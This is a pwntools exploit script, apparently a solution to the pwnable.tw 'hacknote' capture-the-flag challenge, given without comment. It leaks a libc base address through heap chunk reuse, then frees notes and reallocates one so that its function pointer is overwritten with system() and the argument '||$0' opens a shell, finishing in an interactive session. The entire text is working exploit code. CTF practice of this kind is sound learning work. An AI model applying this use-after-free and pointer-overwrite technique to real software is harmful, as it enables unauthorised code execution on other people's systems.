from pwn import *
# context.log_level='debug'
elf=ELF("./hacknote")
# libc = ELF('libc-2.23.so')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
r = elf.process()
# r = remote('chall.pwnable.tw',10102)
# onegadget = [0x3ac6c,0x3ac6e,0x3ac72,0x3ac79,0x5fbd5,0x5fbd6]
onegadget = [0x3a819,0x5f065,0x5f066]
def add(size,content):
	r.recvuntil("Your choice :")
	r.sendline('1')
	r.recvuntil("Note size :")
	r.sendline(str(size))
	r.recvuntil("Content :")
	r.send(content)

def delete(idx):
    r.recvuntil("Your choice :")
    r.sendline('2')
    r.recvuntil("Index :")
    r.sendline(str(idx))

def show(idx):
    r.recvuntil("Your choice :")
    r.sendline('3')
    r.recvuntil("Index :")
    r.sendline(str(idx))

add(0x18,'aaa')
add(0x90,'ccc')
add(0x18,'ddd')
delete(1)
add(0x90,'aaaa')
show(1)

r.recvuntil('a'*4)
libc_base = u32(r.recvline().strip('\n')) - 0x1b07b0-0x3000
# print hex(48 + 0x18 + libc.sym['__malloc_hook'])
info(hex(libc_base))
gdb.attach(r)
# print hex(libc.sym['__malloc_hook'])
rce = libc_base + onegadget[1]
sys = libc_base + libc.sym['system']
delete(0)
delete(1)
add(8,p32(sys)+"||$0")
# add(8,p32(rce))
show(0)
r.interactive()